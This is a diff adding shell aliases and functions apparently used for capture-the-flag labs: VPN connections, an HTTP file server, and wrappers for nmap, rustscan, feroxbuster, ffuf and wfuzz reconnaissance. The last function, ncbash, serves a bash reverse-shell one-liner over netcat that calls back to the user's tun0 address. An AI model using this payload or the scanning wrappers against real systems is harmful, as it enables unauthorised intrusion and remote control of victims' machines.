@@ -1,0 +1,49 @@
+alias tryhackme='sudo openvpn ~/ctf/thm/Nasrallah.ovpn'
+alias hackthebox='sudo openvpn ~/ctf/htb/lab_0xNasrallah.ovpn'
+alias upd='sudo apt update'
+alias upg='sudo apt upgrade'
+alias thm='cd ~/ctf/thm/'
+alias htb='cd ~/ctf/htb/'
+alias www='sudo python3 -m http.server 80'
+alias ctfwww='cd ~/ctf/www && www'
+alias hosts='sudo vim /etc/hosts'
+alias tun0cp="ifconfig tun0 | grep 'inet ' | cut -d' ' -f10 | tr -d '\n' | xclip -sel clip"
+alias tun0="ifconfig tun0 | grep 'inet ' | cut -d' ' -f10 | tr -d '\n'"
+
+nmapcv() {
+    [ ! -d "./scans" ] && mkdir scans
+    sudo nmap -sCV -T4 "${@}" | tee scans/nmap
+}
+
+nmapall() {
+    [ ! -d "./scans" ] && mkdir scans
+    sudo nmap --min-rate 1000 -p- -T4 "${@}" | tee scans/nmapall
+}
+
+rustall() {
+    rustscan -r 0-65535 --ulimit 5000 $1 -t 9000 -- -sV -sC
+}
+
+ferobig () { 
+    url="$1"; shift; feroxbuster -w /usr/share/wordlists/seclists/Discovery/Web-Content/big.txt -u http://$url "$@"
+}
+
+ferodir () { 
+    url="$1"; shift; feroxbuster -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -u http://$url "$@"
+}
+
+ferocom () {
+    url="$1"; shift; feroxbuster -w /usr/share/wordlists/seclists/Discovery/Web-Content/common.txt -u http://$url "$@"
+}
+
+ffufnames () {
+    url="$1"; shift; ffuf -c -w /usr/share/seclists/Discovery/DNS/namelist.txt -u http://$url -H "Host: FUZZ.$url" "$@"
+}
+
+wfuzznames () {
+    url="$1"; shift; wfuzz -c -w /usr/share/seclists/Discovery/DNS/namelist.txt -u http://$url -H "Host: FUZZ.$url" "$@"
+}
+
+ncbash () {
+    echo "bash -i >& /dev/tcp/$(tun0)/9001 0>&1" | nc -lvnp 1234
+}
